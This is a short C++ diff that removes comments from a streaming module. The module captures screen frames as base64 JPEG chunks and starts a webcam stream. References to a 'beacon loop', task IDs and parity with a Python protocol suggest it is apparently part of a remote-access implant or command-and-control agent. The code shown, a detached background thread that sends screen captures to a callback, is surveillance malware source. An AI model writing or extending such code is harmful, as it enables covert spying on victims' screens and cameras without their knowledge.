@@ -33,14 +33,10 @@ namespace streaming {
                 if (!jpg.empty()) {
                     std::string b64 = crypto::Base64Encode(jpg);
                     std::string output = "SCREEN_STREAM_CHUNK:" + b64;
-                    // Task ID for chunks usually appended with counter in Python, but here we keep it simple or follow protocol
-                    // Python: "screen_stream_chunk_{chunk_id}"
-                    
                     callback("screen_stream_chunk_" + std::to_string(chunkId), output);
                     chunkId++;
                 }
 
-                // Reduce FPS to 1 to avoid overwhelming beacon loop and memory
                 std::this_thread::sleep_for(std::chrono::milliseconds(1000));
             }
 
@@ -80,13 +76,12 @@ namespace streaming {
         if (screenStreamActive) return;
         screenStreamActive = true;
         screenThread = std::thread(ScreenWorker, durationSec, taskId, callback);
-        screenThread.detach(); // Detach to let it run background
+        screenThread.detach();
     }
 
     void StopScreenStream() {
         screenStreamActive = false;
         std::lock_guard<std::mutex> lock(screenMutex);
-        // Worker will exit
     }
 
     void StartWebcamStream(int durationSec, const std::string& taskId, ResultCallback callback) {
